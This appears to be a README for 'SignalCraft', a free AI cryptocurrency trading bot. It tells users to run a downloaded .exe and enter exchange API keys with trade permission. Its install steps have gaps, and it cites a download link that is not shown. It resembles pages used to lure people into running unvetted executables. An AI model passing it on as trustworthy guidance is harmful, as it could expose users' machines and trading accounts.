SignalCraft provides AI-powered insights for cryptocurrency markets. It uses the DeepSeek V4 model to analyze trends and manage trades across many exchanges. The software includes two main modes: observer mode for market monitoring and execution mode for automated trading.

1. Locate the downloaded `.exe` file in your Downloads folder.

4. Follow the prompts in the setup window to finish the installation.
5. Launch the application from your desktop shortcut once the setup finishes.

## ⚙️ Initial configuration

You must connect your exchange account before the software can analyze charts or place trades.

1. Open your crypto exchange website and log in.
2. Find your API Settings page.
3. Create a new set of API keys. Give the keys "Read" and "Trade" permissions. Do not enable "Withdraw" permissions.
4. Copy the API Key and the API Secret.
5. Open the SignalCraft main menu.
6. Click on "Settings" and then "Exchange Setup."
7. Choose your exchange from the list.
8. Paste your API Key and Secret into the fields.
9. Click "Save."

## 📊 Understanding the modes

The software works in two distinct ways. You choose your preferred mode inside the dashboard menu.

### Observer Mode
In this mode, the AI monitors the market for specific patterns. It sends you notifications when a trade signal appears. The software does not place trades for you in this mode. This is useful if you want to verify the AI results before you commit money.

### Execution Mode
In this mode, the AI monitors the market and manages trades based on your risk settings. The software detects entry and exit points. It handles the trading process on your linked exchange account.

* Keep your API keys private. Never share these with anyone.
* Run the software only on your personal machine.
* Use 2FA on your exchange accounts for an extra layer of protection.
* Periodically check your trade history on both the application and the exchange website to ensure they match.

## 🧩 Troubleshooting common issues

If the application does not connect to your exchange, follow these steps:

1. Check your internet connection.
2. Verify that your API keys are correct.
3. Make sure the exchange is not undergoing maintenance.
4. Re-enter your API keys if the application shows an authentication error.

If the application feels slow:

1. Close other programs that use significant memory.
2. Restart the application.
3. Check the "Logs" tab to see if the system reports any errors.

## 🧠 Frequently asked questions

**Does the software store my funds?**
No. Your crypto stays on your exchange account. The application only sends trade instructions.

**Can I run this on a Mac?**
Yes. You can download the version intended for macOS from the same link provided earlier. The installation process follows similar steps.

**Is this service free?**
Yes. This is open-source software. There is no charge for the application itself.

**How do I stop automated trading?**
Switch the application from "Execution Mode" to "Observer Mode" or click the "Pause" button on the main dashboard to stop all active trades immediately.
